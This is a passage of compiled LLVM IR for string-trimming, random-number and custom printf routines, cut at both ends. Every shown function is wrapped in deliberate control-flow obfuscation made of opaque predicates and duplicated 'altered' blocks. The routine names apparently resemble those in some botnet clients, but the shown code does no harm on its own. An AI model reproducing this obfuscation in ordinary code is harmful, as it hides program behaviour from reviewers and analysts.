  %_3 = sub i32 0, %57
  %gen4 = add i32 %_3, %58
  %59 = sub i32 %57, %58
  %60 = load i32, i32* @rand_cmwc.i, align 4
  %61 = zext i32 %60 to i64
  %62 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %61
  store i32 %59, i32* %62, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* @x.3
  %25 = load i32, i32* @y.4
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i32, i32* %5, align 4
  %33 = load i32, i32* %4, align 4
  %34 = icmp sge i32 %32, %33
  %35 = load i32, i32* @x.3
  %36 = load i32, i32* @y.4
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %52

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i8*, i8** %2, align 8
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = call i32 @isspace(i32 %49) #10
  %51 = icmp ne i32 %50, 0
  br label %52

; <label>:52:                                     ; preds = %43, %originalBBpart2
  %53 = phi i1 [ false, %originalBBpart2 ], [ %51, %43 ]
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %52
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, -1
  store i32 %56, i32* %5, align 4
  br label %23

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* %4, align 4
  store i32 %58, i32* %3, align 4
  br label %59

; <label>:59:                                     ; preds = %75, %57
  %60 = load i32, i32* %3, align 4
  %61 = load i32, i32* %5, align 4
  %62 = icmp sle i32 %60, %61
  br i1 %62, label %63, label %78

; <label>:63:                                     ; preds = %59
  %64 = load i8*, i8** %2, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = load i8*, i8** %2, align 8
  %70 = load i32, i32* %3, align 4
  %71 = load i32, i32* %4, align 4
  %72 = sub nsw i32 %70, %71
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %69, i64 %73
  store i8 %68, i8* %74, align 1
  br label %75

; <label>:75:                                     ; preds = %63
  %76 = load i32, i32* %3, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %3, align 4
  br label %59

; <label>:78:                                     ; preds = %59
  %79 = load i8*, i8** %2, align 8
  %80 = load i32, i32* %3, align 4
  %81 = load i32, i32* %4, align 4
  %82 = sub nsw i32 %80, %81
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %79, i64 %83
  store i8 0, i8* %84, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %23
  %85 = load i32, i32* %5, align 4
  %86 = load i32, i32* %4, align 4
  %87 = icmp sge i32 %85, %86
  br label %originalBB
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = load i32, i32* @x.5
  %3 = load i32, i32* @y.6
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %10, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %10, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %16 = call i32 @print(i8** null, i8* %14, %struct.__va_list_tag* %15)
  %17 = load i32, i32* @x.5
  %18 = load i32, i32* @y.6
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %16

originalBBalteredBB:                              ; preds = %originalBB, %1
  %25 = alloca i8*, align 8
  %26 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %25, align 8
  %27 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %28 = bitcast %struct.__va_list_tag* %27 to i8*
  call void @llvm.va_start(i8* %28)
  %29 = load i8*, i8** %25, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %31 = call i32 @print(i8** null, i8* %29, %struct.__va_list_tag* %30)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %491, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %494

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %466

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %22
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* @x.7
  %39 = load i32, i32* @y.8
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %494

; <label>:46:                                     ; preds = %22
  %47 = load i32, i32* @x.7
  %48 = load i32, i32* @y.8
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8*, i8** %5, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 37
  %59 = load i32, i32* @x.7
  %60 = load i32, i32* @y.8
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %58, label %67, label %68

; <label>:67:                                     ; preds = %originalBBpart24
  br label %467

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i32, i32* @x.7
  %70 = load i32, i32* @y.8
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 45
  %81 = load i32, i32* @x.7
  %82 = load i32, i32* @y.8
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %80, label %89, label %92

; <label>:89:                                     ; preds = %originalBBpart28
  %90 = load i8*, i8** %5, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %92

; <label>:92:                                     ; preds = %89, %originalBBpart28
  %93 = load i32, i32* @x.7
  %94 = load i32, i32* @y.8
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %92
  %101 = load i32, i32* @x.7
  %102 = load i32, i32* @y.8
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %109

; <label>:109:                                    ; preds = %114, %originalBBpart212
  %110 = load i8*, i8** %5, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 48
  br i1 %113, label %114, label %119

; <label>:114:                                    ; preds = %109
  %115 = load i8*, i8** %5, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %5, align 8
  %117 = load i32, i32* %8, align 4
  %118 = or i32 %117, 2
  store i32 %118, i32* %8, align 4
  br label %109

; <label>:119:                                    ; preds = %109
  %120 = load i32, i32* @x.7
  %121 = load i32, i32* @y.8
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %119
  %128 = load i32, i32* @x.7
  %129 = load i32, i32* @y.8
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %136

; <label>:136:                                    ; preds = %173, %originalBBpart216
  %137 = load i8*, i8** %5, align 8
  %138 = load i8, i8* %137, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp sge i32 %139, 48
  br i1 %140, label %141, label %162

; <label>:141:                                    ; preds = %136
  %142 = load i32, i32* @x.7
  %143 = load i32, i32* @y.8
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %141
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp sle i32 %152, 57
  %154 = load i32, i32* @x.7
  %155 = load i32, i32* @y.8
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %162

; <label>:162:                                    ; preds = %originalBBpart220, %136
  %163 = phi i1 [ false, %136 ], [ %153, %originalBBpart220 ]
  br i1 %163, label %164, label %176

; <label>:164:                                    ; preds = %162
  %165 = load i32, i32* %7, align 4
  %166 = mul nsw i32 %165, 10
  store i32 %166, i32* %7, align 4
  %167 = load i8*, i8** %5, align 8
  %168 = load i8, i8* %167, align 1
  %169 = zext i8 %168 to i32
  %170 = sub nsw i32 %169, 48
  %171 = load i32, i32* %7, align 4
  %172 = add nsw i32 %171, %170
  store i32 %172, i32* %7, align 4
  br label %173

; <label>:173:                                    ; preds = %164
  %174 = load i8*, i8** %5, align 8
  %175 = getelementptr inbounds i8, i8* %174, i32 1
  store i8* %175, i8** %5, align 8
  br label %136

; <label>:176:                                    ; preds = %162
  %177 = load i8*, i8** %5, align 8
  %178 = load i8, i8* %177, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 115
  br i1 %180, label %181, label %247

; <label>:181:                                    ; preds = %176
  %182 = load i32, i32* @x.7
  %183 = load i32, i32* @y.8
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %181
  %190 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 8
  %193 = icmp ule i32 %192, 40
  %194 = load i32, i32* @x.7
  %195 = load i32, i32* @y.8
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %193, label %202, label %208

; <label>:202:                                    ; preds = %originalBBpart224
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %205 = getelementptr i8, i8* %204, i32 %192
  %206 = bitcast i8* %205 to i32*
  %207 = add i32 %192, 8
  store i32 %207, i32* %191, align 8
  br label %213

; <label>:208:                                    ; preds = %originalBBpart224
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  br label %213

; <label>:213:                                    ; preds = %208, %202
  %214 = phi i32* [ %206, %202 ], [ %211, %208 ]
  %215 = load i32, i32* %214, align 4
  %216 = sext i32 %215 to i64
  %217 = inttoptr i64 %216 to i8*
  store i8* %217, i8** %11, align 8
  %218 = load i8**, i8*** %4, align 8
  %219 = load i8*, i8** %11, align 8
  %220 = icmp ne i8* %219, null
  br i1 %220, label %221, label %223

; <label>:221:                                    ; preds = %213
  %222 = load i8*, i8** %11, align 8
  br label %240

; <label>:223:                                    ; preds = %213
  %224 = load i32, i32* @x.7
  %225 = load i32, i32* @y.8
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %223
  %232 = load i32, i32* @x.7
  %233 = load i32, i32* @y.8
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %240

; <label>:240:                                    ; preds = %originalBBpart228, %221
  %241 = phi i8* [ %222, %221 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i32 0, i32 0), %originalBBpart228 ]
  %242 = load i32, i32* %7, align 4
  %243 = load i32, i32* %8, align 4
  %244 = call i32 @prints(i8** %218, i8* %241, i32 %242, i32 %243)
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, %244
  store i32 %246, i32* %9, align 4
  br label %491

; <label>:247:                                    ; preds = %176
  %248 = load i32, i32* @x.7
  %249 = load i32, i32* @y.8
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %247
  %256 = load i8*, i8** %5, align 8
  %257 = load i8, i8* %256, align 1
  %258 = zext i8 %257 to i32
  %259 = icmp eq i32 %258, 100
  %260 = load i32, i32* @x.7
  %261 = load i32, i32* @y.8
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %259, label %268, label %309

; <label>:268:                                    ; preds = %originalBBpart232
  %269 = load i8**, i8*** %4, align 8
  %270 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %271 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 8
  %273 = icmp ule i32 %272, 40
  br i1 %273, label %274, label %296

; <label>:274:                                    ; preds = %268
  %275 = load i32, i32* @x.7
  %276 = load i32, i32* @y.8
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %274
  %283 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 3
  %284 = load i8*, i8** %283, align 8
  %285 = getelementptr i8, i8* %284, i32 %272
  %286 = bitcast i8* %285 to i32*
  %287 = add i32 %272, 8
  store i32 %287, i32* %271, align 8
  %288 = load i32, i32* @x.7
  %289 = load i32, i32* @y.8
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %301

; <label>:296:                                    ; preds = %268
  %297 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 2
  %298 = load i8*, i8** %297, align 8
  %299 = bitcast i8* %298 to i32*
  %300 = getelementptr i8, i8* %298, i32 8
  store i8* %300, i8** %297, align 8
  br label %301

; <label>:301:                                    ; preds = %296, %originalBBpart236
  %302 = phi i32* [ %286, %originalBBpart236 ], [ %299, %296 ]
  %303 = load i32, i32* %302, align 4
  %304 = load i32, i32* %7, align 4
  %305 = load i32, i32* %8, align 4
  %306 = call i32 @printi(i8** %269, i32 %303, i32 10, i32 1, i32 %304, i32 %305, i32 97)
  %307 = load i32, i32* %9, align 4
  %308 = add nsw i32 %307, %306
  store i32 %308, i32* %9, align 4
  br label %491

; <label>:309:                                    ; preds = %originalBBpart232
  %310 = load i8*, i8** %5, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 120
  br i1 %313, label %314, label %355

; <label>:314:                                    ; preds = %309
  %315 = load i8**, i8*** %4, align 8
  %316 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %317 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 0
  %318 = load i32, i32* %317, align 8
  %319 = icmp ule i32 %318, 40
  br i1 %319, label %320, label %342

; <label>:320:                                    ; preds = %314
  %321 = load i32, i32* @x.7
  %322 = load i32, i32* @y.8
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %320
  %329 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 3
  %330 = load i8*, i8** %329, align 8
  %331 = getelementptr i8, i8* %330, i32 %318
  %332 = bitcast i8* %331 to i32*
  %333 = add i32 %318, 8
  store i32 %333, i32* %317, align 8
  %334 = load i32, i32* @x.7
  %335 = load i32, i32* @y.8
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %347

; <label>:342:                                    ; preds = %314
  %343 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 2
  %344 = load i8*, i8** %343, align 8
  %345 = bitcast i8* %344 to i32*
  %346 = getelementptr i8, i8* %344, i32 8
  store i8* %346, i8** %343, align 8
  br label %347

; <label>:347:                                    ; preds = %342, %originalBBpart240
  %348 = phi i32* [ %332, %originalBBpart240 ], [ %345, %342 ]
  %349 = load i32, i32* %348, align 4
  %350 = load i32, i32* %7, align 4
  %351 = load i32, i32* %8, align 4
  %352 = call i32 @printi(i8** %315, i32 %349, i32 16, i32 0, i32 %350, i32 %351, i32 97)
  %353 = load i32, i32* %9, align 4
  %354 = add nsw i32 %353, %352
  store i32 %354, i32* %9, align 4
  br label %491

; <label>:355:                                    ; preds = %309
  %356 = load i8*, i8** %5, align 8
  %357 = load i8, i8* %356, align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 88
  br i1 %359, label %360, label %385

; <label>:360:                                    ; preds = %355
  %361 = load i8**, i8*** %4, align 8
  %362 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %363 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %362, i32 0, i32 0
  %364 = load i32, i32* %363, align 8
  %365 = icmp ule i32 %364, 40
  br i1 %365, label %366, label %372

; <label>:366:                                    ; preds = %360
  %367 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %362, i32 0, i32 3
  %368 = load i8*, i8** %367, align 8
  %369 = getelementptr i8, i8* %368, i32 %364
  %370 = bitcast i8* %369 to i32*
  %371 = add i32 %364, 8
  store i32 %371, i32* %363, align 8
  br label %377

; <label>:372:                                    ; preds = %360
  %373 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %362, i32 0, i32 2
  %374 = load i8*, i8** %373, align 8
  %375 = bitcast i8* %374 to i32*
  %376 = getelementptr i8, i8* %374, i32 8
  store i8* %376, i8** %373, align 8
  br label %377

; <label>:377:                                    ; preds = %372, %366
  %378 = phi i32* [ %370, %366 ], [ %375, %372 ]
  %379 = load i32, i32* %378, align 4
  %380 = load i32, i32* %7, align 4
  %381 = load i32, i32* %8, align 4
  %382 = call i32 @printi(i8** %361, i32 %379, i32 16, i32 0, i32 %380, i32 %381, i32 65)
  %383 = load i32, i32* %9, align 4
  %384 = add nsw i32 %383, %382
  store i32 %384, i32* %9, align 4
  br label %491

; <label>:385:                                    ; preds = %355
  %386 = load i8*, i8** %5, align 8
  %387 = load i8, i8* %386, align 1
  %388 = zext i8 %387 to i32
  %389 = icmp eq i32 %388, 117
  br i1 %389, label %390, label %431

; <label>:390:                                    ; preds = %385
  %391 = load i32, i32* @x.7
  %392 = load i32, i32* @y.8
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %390
  %399 = load i8**, i8*** %4, align 8
  %400 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %401 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %400, i32 0, i32 0
  %402 = load i32, i32* %401, align 8
  %403 = icmp ule i32 %402, 40
  %404 = load i32, i32* @x.7
  %405 = load i32, i32* @y.8
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %403, label %412, label %418

; <label>:412:                                    ; preds = %originalBBpart244
  %413 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %400, i32 0, i32 3
  %414 = load i8*, i8** %413, align 8
  %415 = getelementptr i8, i8* %414, i32 %402
  %416 = bitcast i8* %415 to i32*
  %417 = add i32 %402, 8
  store i32 %417, i32* %401, align 8
  br label %423

; <label>:418:                                    ; preds = %originalBBpart244
  %419 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %400, i32 0, i32 2
  %420 = load i8*, i8** %419, align 8
  %421 = bitcast i8* %420 to i32*
  %422 = getelementptr i8, i8* %420, i32 8
  store i8* %422, i8** %419, align 8
  br label %423

; <label>:423:                                    ; preds = %418, %412
  %424 = phi i32* [ %416, %412 ], [ %421, %418 ]
  %425 = load i32, i32* %424, align 4
  %426 = load i32, i32* %7, align 4
  %427 = load i32, i32* %8, align 4
  %428 = call i32 @printi(i8** %399, i32 %425, i32 10, i32 0, i32 %426, i32 %427, i32 97)
  %429 = load i32, i32* %9, align 4
  %430 = add nsw i32 %429, %428
  store i32 %430, i32* %9, align 4
  br label %491

; <label>:431:                                    ; preds = %385
  %432 = load i8*, i8** %5, align 8
  %433 = load i8, i8* %432, align 1
  %434 = zext i8 %433 to i32
  %435 = icmp eq i32 %434, 99
  br i1 %435, label %436, label %465

; <label>:436:                                    ; preds = %431
  %437 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %438 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 8
  %440 = icmp ule i32 %439, 40
  br i1 %440, label %441, label %447

; <label>:441:                                    ; preds = %436
  %442 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %437, i32 0, i32 3
  %443 = load i8*, i8** %442, align 8
  %444 = getelementptr i8, i8* %443, i32 %439
  %445 = bitcast i8* %444 to i32*
  %446 = add i32 %439, 8
  store i32 %446, i32* %438, align 8
